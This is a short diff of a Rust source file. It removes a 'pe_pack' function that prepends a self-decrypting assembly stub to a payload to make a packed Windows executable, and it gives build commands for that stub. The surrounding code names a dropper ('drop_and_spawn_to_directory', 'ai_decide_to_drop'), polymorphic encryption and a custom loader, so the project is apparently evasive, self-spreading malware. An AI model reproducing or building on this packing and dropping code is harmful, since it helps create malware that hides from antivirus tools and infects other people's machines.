@@ -114,26 +114,7 @@ fn ai_decide_to_drop(file_count: f32, depth: f32, verbose: bool) -> bool {
 
 // Removed polymorphic_encrypt - now handled inline in drop_and_spawn_to_directory
 
-// PE Packer - creates a self-decrypting executable with compiled assembly stub
-fn pe_pack(binary: &[u8]) -> Vec<u8> {
-    // Load the compiled assembly stub
-    let stub_code = match std::fs::read("stub.exe") {
-        Ok(code) => code,
-        Err(_) => {
-            eprintln!("[-] ERROR: stub.exe not found! Compile stub.asm first:");
-            eprintln!("    nasm -f bin stub.asm -o stub.exe");
-            eprintln!("    or use MASM: ml /c /coff stub.asm && link /subsystem:windows stub.obj");
-            // Fallback to dummy for compilation
-            vec![0x4D, 0x5A, 0x00, 0x00]
-        }
-    };
-
-    let mut packed = stub_code;
-    packed.extend_from_slice(b"PE_PACK"); // Custom signature for stub to find
-    packed.extend_from_slice(&(binary.len() as u32).to_le_bytes()); // Payload size
-    packed.extend(binary); // Payload (will be encrypted later)
-    packed
-}
+// Removed pe_pack function - functionality moved inline to drop_and_spawn_to_directory
 
 // Custom Loader - validates packed executable format
 // In a real implementation, this would be the stub code that runs first
